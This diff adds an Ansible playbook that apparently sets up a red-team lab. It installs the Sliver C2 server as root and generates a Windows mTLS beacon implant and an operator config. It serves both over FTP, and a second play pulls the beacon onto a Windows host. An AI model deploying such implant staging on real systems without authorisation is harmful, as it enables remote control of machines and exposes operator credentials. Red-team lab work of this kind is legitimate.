@@ -1,0 +1,98 @@
+- name: "Setup Sliver C2 on Puppet Master"
+  hosts: puppet_master
+  become: true
+  vars:
+    ftp_root: /srv/ftp
+    sliver_version: "v1.5.44" # Use latest stable
+  tasks:
+    - name: Install Sliver Prerequisites
+      become: true
+      apt:
+        name:
+          - curl
+          - git
+          - build-essential
+        state: present
+
+    - name: Download and Run Official Sliver Install Script
+      become: true
+      shell: |
+        # Use the official one-liner
+        curl https://sliver.sh/install -o /tmp/install-sliver.sh
+        chmod +x /tmp/install-sliver.sh
+        /tmp/install-sliver.sh
+
+        rm /tmp/install-sliver.sh
+
+    - name: Create Sliver Systemd Service (Official Daemon Mode)
+      become: true
+      copy:
+        dest: /etc/systemd/system/sliver.service
+        content: |
+          [Unit]
+          Description=Sliver C2 Server
+          After=network.target
+
+          [Service]
+          Type=simple
+          User=root
+          WorkingDirectory=/root
+          ExecStart=/root/sliver-server daemon
+
+          Restart=on-failure
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: Start and Enable Sliver Service
+      become: true
+      systemd:
+        name: sliver
+        state: restarted
+        enabled: yes
+        daemon_reload: yes
+
+    - name: Open Sliver C2 Port (Mutual TLS)
+      ufw:
+        rule: allow
+        port: '31337' # Default Sliver Port
+        proto: tcp
+
+    - name: Generate Sliver Operator Config
+      shell: |
+        /root/sliver-server operator --name red --lhost {{ ansible_host }} --save {{ ftp_root }}/config.cfg
+      args:
+        creates: "{{ ftp_root }}/config.cfg"
+
+    - name: Generate Sliver Assets for FTP
+      become: true
+      shell: |
+        # Ensure assets are installed (Required for compilation)
+        /root/sliver-server assets install
+        /root/sliver-server <<< "generate beacon --mtls {{ ansible_host }} --os windows --arch amd64 --save {{ ftp_root }}/beacon.exe"
+
+        cp /root/sliver-client_linux {{ ftp_root }}/sliver-client
+
+        # Sync permissions for FTP access
+        chown -R ftp:ftp {{ ftp_root }}
+        chmod 755 {{ ftp_root }}/*
+
+        echo "mtls" | {{ ftp_root }}/sliver-client
+      args:
+        executable: /bin/bash
+
+    - name: Ensure FTP permissions for sliver files
+      file:
+        path: "{{ ftp_root }}"
+        state: directory
+        owner: ftp
+        mode: '0555'
+        recurse: yes
+
+- name: "Setup Sliver C2 beacons"
+  hosts: server
+  tasks:
+    - name: Download Sliver Beacon from server
+      win_get_url:
+        url: "ftp://{{ groups['puppet_master'][0] }}/beacon.exe"
+        dest: 'C:\Files\sliver_beacon.exe'
